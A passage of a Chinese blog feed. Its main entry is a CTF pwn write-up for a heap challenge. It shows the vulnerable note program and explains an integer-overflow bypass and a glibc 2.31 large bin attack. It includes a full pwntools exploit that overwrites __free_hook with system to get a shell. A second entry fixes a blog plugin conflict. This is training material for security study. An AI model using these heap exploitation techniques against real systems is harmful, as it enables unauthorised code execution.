class="string">"%d%*c"</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Count: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print note */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(<span class="number">1</span>, note-&gt;content, note-&gt;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Delete note */</span></span><br><span class="line">  <span class="built_in">free</span>(note-&gt;content);</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">  note-&gt;content = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. CreateNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. EditNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. PrintNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. DeleteNote"</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> choice, index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input choice */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choice: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (choice &lt; <span class="number">1</span> || choice &gt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input index */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;index) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Security check */</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= MAX_NOTE) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: CreateNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: EditNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: PrintNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: DeleteNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要漏洞在它的edit功能的安全检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Security check */</span></span><br><span class="line"><span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line"><span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line"><span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br></pre></td></tr></table></figure><p>题目在<code>offset + count</code>进行检查时，忘了在int64 中<code>0x8000000==0</code>的情况。</p><p>导致我们可以任意写，然后通过 <code>PrintNote</code>泄露出基地址。</p><p>但是，由于calloc函数，导致我们不能用tache bin 来attack。</p><p>但是由于题目没有限制chunk大小，导致我们可以利用Large bin Attack 写入<em>`</em>free_hook+0x20<code>处再创造chunk覆盖</code>__free_hook`为system。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/07 21:47:24</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./chall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.bsidesahmedabad.in'</span>,<span class="number">9003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,offset,count,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Offset:'</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    p.recvuntil(<span class="string">'Count:'</span>)</span><br><span class="line">    p.sendline(str(count))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x548</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2147483647</span><span class="number">-1</span>,<span class="string">'8'</span>*<span class="number">0x46</span>+p64(<span class="number">0x501</span>)+<span class="string">'8'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x2d8</span>,<span class="string">'x'</span>*<span class="number">0x270</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x281</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">6</span>)</span><br><span class="line">free_hook=x.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">'1'</span>*<span class="number">8</span>) <span class="comment">#p1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'2'</span>*<span class="number">8</span>)<span class="comment">#g1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">'3'</span>*<span class="number">8</span>)<span class="comment">#p2</span></span><br><span class="line"><span class="comment"># put a chunk to unsorted bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># put a chunk to large bin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x438</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># put a chunk to unsorted bi</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#modify bk-&gt;next of chunk p1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x38</span>, (<span class="number">0x7fffffff</span><span class="number">-0x38</span>+<span class="number">1</span>), p64(free_hook<span class="number">-0x4b</span><span class="number">-2</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">'3'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, (<span class="number">0x7fffffff</span><span class="number">-8</span>+<span class="number">1</span>),<span class="number">0x40</span>*<span class="string">'1'</span>+p64(<span class="number">0x51</span>)+p64(free_hook<span class="number">-0x30</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">'3'</span>*<span class="number">0x20</span>+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/244018" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244018</a></p><p><a href="https://www.anquanke.com/post/id/242640#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242640#h2-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉&lt;del&gt;~&lt;/del&gt;(◞‸◟ )tcl…）</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</title>
    <link href="lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/"/>
    <id>lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/</id>
    <published>2021-11-03T12:58:38.417Z</published>
    <updated>2022-02-22T12:22:17.129Z</updated>
    
    <content type="html"><![CDATA[<p>今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。<a id="more"></a></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>未安装live2d且不蒜子配置正常，执行<code>npm install --save hexo-helper-live2d</code>后，不蒜子计数冲突不显示计数。<br>已安装live2d但<code>live2d.enable</code>由<code>true</code>改为<code>false</code>后，不蒜子显示计数。</p><p>同时正常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>异常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.打开footer.ejs文件，找到与不蒜子相关的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>2.删除<code>&lt;span id=&quot;busuanzi_container_page_pv&quot; style=&#39;display:inline&#39;&gt;</code>和<code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:inline&#39;&gt;</code>语句。</p><p>3.在<code>&lt;% if (theme.visit_counter.on) { %&gt;</code>语句后，添加<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     &lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">&lt;script async&#x3D;&quot;&quot; src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">         &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span 